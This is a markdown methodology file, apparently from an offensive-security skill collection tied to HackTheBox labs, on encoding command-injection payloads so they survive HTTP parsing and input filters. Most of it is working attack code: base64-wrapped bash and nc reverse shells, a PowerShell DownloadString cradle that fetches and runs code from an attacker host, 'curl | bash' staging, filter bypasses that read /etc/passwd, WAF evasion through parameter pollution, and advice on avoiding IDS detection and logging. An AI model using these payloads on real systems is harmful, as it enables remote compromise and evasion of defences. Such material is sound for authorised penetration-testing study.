# URL Encoding Bypass for Web Exploits

> The most common reason a "working" exploit silently fails: special
> characters in your shell payload are mangled by the HTTP request
> parser. Base64 + `base64 -d | bash` (or PowerShell equivalent) bypass
> this entirely.

## Objective
Reliably deliver shell metacharacters through HTTP parameters, headers,
and JSON bodies without losing semantics.

## When To Use
- An exploit fires (HTTP 200) but no shell connects back.
- Burp shows the payload reaches the server, but you still don't get
  RCE evidence.
- The target's input filter rejects characters you need (`>`, `&`,
  `|`, `;`, spaces).

## Detection Indicators
- The server returns success codes but no callback.
- Manual `curl` of a `?cmd=id` succeeds, but `?cmd=bash -i >& /dev/tcp/...`
  fails.
- Burp request shows the body got URL-decoded incorrectly (look at
  the actual outbound bytes).

## Enumeration Strategy

Test what the server accepts with simple probes:

```bash
# baseline: simple string echo
curl -G "http://<ip>/v?cmd=echo+hello"

# whitespace handling
curl -G "http://<ip>/v?cmd=id"          # works → metachars probably the issue
curl -G "http://<ip>/v?cmd=id+;+id"     # `;` works?
curl -G "http://<ip>/v?cmd=id+%26%26+id"  # `&&` works?
curl -G "http://<ip>/v?cmd=id+|+id"      # `|` works?
```

## Exploitation Workflow

### Bypass 1 — base64 envelope (most reliable)

Encode the entire payload, decode on target.

```bash
# Linux target
PAYLOAD='bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
ENC=$(echo -n "$PAYLOAD" | base64 -w0)
INJECT="echo $ENC | base64 -d | bash"
# now URL-encode INJECT once, send as the parameter value
curl -G "http://<ip>/v" --data-urlencode "cmd=$INJECT"
```

```bash
# Windows target
$P = "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.x/p.ps1')"
$ENC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($P))
# server-side:
powershell -e <ENC>
```

### Bypass 2 — IFS / brace expansion (when base64 not available)

```bash
# spaces blocked but ${IFS} works
curl "http://<ip>/v?cmd=cat${IFS}/etc/passwd"

# brace expansion (works in bash, dash, sh)
curl "http://<ip>/v?cmd={cat,/etc/passwd}"

# tab as IFS
curl "http://<ip>/v?cmd=cat$'\t'/etc/passwd"
```

### Bypass 3 — backslash quoting

```bash
# specific characters blocked → backslash-escape them on the shell
curl "http://<ip>/v?cmd=\\bash\\ -i\\ >&\\ /dev/tcp/<atk>/4444\\ 0>&1"
```

### Bypass 4 — hex / unicode escapes

```bash
# `\x20` for space in many shells
curl "http://<ip>/v?cmd=cat\\x20/etc/passwd"

# Python-side encoding for awkward chars
python3 -c "print(open('payload','rb').read().hex())"
```

### Bypass 5 — request smuggling / parameter pollution

When a WAF inspects only the first occurrence of a parameter:
```
cmd=id&cmd=bash -i >& /dev/tcp/<ip>/4444 0>&1
```
Some applications use the *last* value; the WAF sees the *first*.

## Commands

```bash
# always-works base64 wrapper for Linux targets
gen_payload() {
  local cb_ip=$1
  local cb_port=$2
  local p="bash -i >& /dev/tcp/$cb_ip/$cb_port 0>&1"
  echo "echo $(echo -n "$p" | base64 -w0) | base64 -d | bash"
}
PAYLOAD=$(gen_payload 10.10.14.1 4444)
curl -G "http://<ip>/path" --data-urlencode "cmd=$PAYLOAD"

# Windows variant
gen_ps_payload() {
  local cb_ip=$1
  local cb_port=$2
  python3 - <<PY
import base64
p=f"IEX (New-Object Net.WebClient).DownloadString('http://{$cb_ip}:8000/p.ps1')"
print(base64.b64encode(p.encode('utf-16-le')).decode())
PY
}
```

## Tool Usage

- `--data-urlencode` (curl) — encode parameter values once.
- Burp `Decoder` tab — for nested encoding inspection.
- `Burp Repeater` — replay the malformed request, tweak by hand.
- `wfuzz`/`ffuf` — encoding payloads in fuzz lists.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Double-URL-encoding when not needed | "?" appears literal in target logs | Encode once; let curl handle the rest |
| Forgetting `-w0` on base64 | Newlines break the wrapper | `base64 -w0` |
| Mixing UTF-8 and UTF-16 in PowerShell encoding | Decoded payload garbled | PowerShell `-e` expects UTF-16-LE base64 |
| Not URL-encoding the `+` character | Sent as literal `+` (which means space) | `%2B` for literal plus |
| Underestimating WAF | "Exploit works in lab, fails in prod" | Test with progressively-aggressive payloads |

## Decision-Making Logic

```
exploit fires (200) but no shell → assume payload mangled
  └─ test parameter with simple echo → confirms RCE works at all
       └─ baseline established
            ├─ try base64 wrapper (highest success rate)
            ├─ if base64 unavailable, brace/IFS bypass
            ├─ if specific chars blocked, hex-escape them
            └─ if WAF, parameter pollution / chunk smuggling
```

## Pivot Opportunities
After a successful payload delivery, you should have a stable reverse
shell. Move to `12-shell-stabilization.md`.

## OPSEC Considerations
- Multiple test payloads light up IDS — minimise probing on real
  engagements.
- Encoded payloads in URL parameters land in access logs verbatim.
- Use the `User-Agent` header for short payloads; less commonly logged
  in detail.

## Real HTB Examples

- **OpenAdmin** — IppSec spends ~10 minutes adjusting payload encoding
  on the ONA exploit; base64 wrapper ultimately works.
- **Tabby** — Tomcat manager + WAR upload; encoding-friendly path.
- **MagicGardens, Faculty, Inject** — modern boxes with stricter input
  filters demand encoding.

## Alternative Techniques

- **Embed the payload in a header** (`User-Agent`, `Cookie`) — different
  parser path, sometimes less filtered.
- **`xxd -p` / `printf "\\x..."`** for byte-by-byte sequencing.
- **Stage a payload from a controlled HTTP server**:
  ```
  cmd=curl http://<atk>/x.sh | bash
  ```
  Less to encode in-line.

## Automation Opportunities

```bash
# auto-encode any reverse shell template
encode_rev_shell() {
  local lhost=$1; local lport=$2; local cmd=$3
  local p
  case $cmd in
    bash)  p="bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
    nc)    p="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" ;;
    *)     echo "unknown"; return 1 ;;
  esac
  printf 'echo %s | base64 -d | bash\n' "$(echo -n "$p" | base64 -w0)"
}
```

## Checklist

- [ ] Confirm RCE with a benign command (echo, id)
- [ ] Identify which characters are filtered
- [ ] Choose appropriate bypass (base64 first)
- [ ] URL-encode the final wrapper once
- [ ] Verify the shell connects back
- [ ] Stabilise

## Related Skills

- [`web/opennetadmin-rce.md`](opennetadmin-rce.md)
- [`web/upload-bypass.md`](upload-bypass.md)
- [`reverse-shells/bash-reverse-shell.md`](../reverse-shells/bash-reverse-shell.md)
- [`reverse-shells/powershell-reverse-shell.md`](../reverse-shells/powershell-reverse-shell.md)
- [`methodology/11-exploit-adaptation.md`](../methodology/11-exploit-adaptation.md)
